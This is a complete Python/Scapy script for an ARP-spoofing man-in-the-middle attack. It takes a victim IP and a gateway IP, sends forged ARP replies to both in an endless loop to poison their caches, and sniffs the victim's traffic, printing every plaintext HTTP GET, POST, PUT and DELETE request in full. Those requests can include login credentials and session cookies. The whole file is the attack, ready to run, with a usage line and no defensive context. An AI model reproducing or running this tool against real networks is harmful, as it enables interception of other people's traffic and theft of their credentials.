#!/usr/bin/python
from scapy.all import *
from time import sleep
import sys
import threading


try:
    interface = sys.argv[1]
    victim_ip = sys.argv[2]
    gateway_ip = sys.argv[3]
except:
    print "Usage: run.py <interface> <victim> <gateway>"
    exit(2)


def get_mac(ip):
    a, b = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2,retry=2)
    print a
    for s, r in a:
        return r[Ether].src
    return None


victim_mac = get_mac(victim_ip)
gateway_mac = get_mac(gateway_ip)

conf.iface = interface
conf.verb = 0


def http_filter(p):
    if p.haslayer(Raw):
        packet = str(p["Raw"])
        method = packet[:10].split(" ")[0]
        allow = ["GET", "POST", "PUT", "DELETE"]
        if method in allow:
            print packet
            print "="*200
        del packet


def go_arp():
    global gateway, victim_ip, gateway_ip, victim_mac, gateway_mac

    victim = ARP()
    victim.op = 2
    victim.psrc = gateway_ip
    victim.pdst = victim_ip
    victim.hwdst = victim_mac

    gateway = ARP()
    gateway.op = 2
    gateway.psrc = victim_ip
    gateway.pdst = gateway_ip
    gateway.hwdst = gateway_mac

    print "========== GOGO ARP!!! =========="
    while 1:
        send(victim)
        send(gateway)
        sleep(1)


print victim_ip
print gateway_ip

print victim_mac
print gateway_mac

pt = threading.Thread(target=go_arp)
pt.start()
print "AA"

my_filter  = "ip host %s" % victim_ip
sniff(filter=my_filter, iface=interface, prn=http_filter)

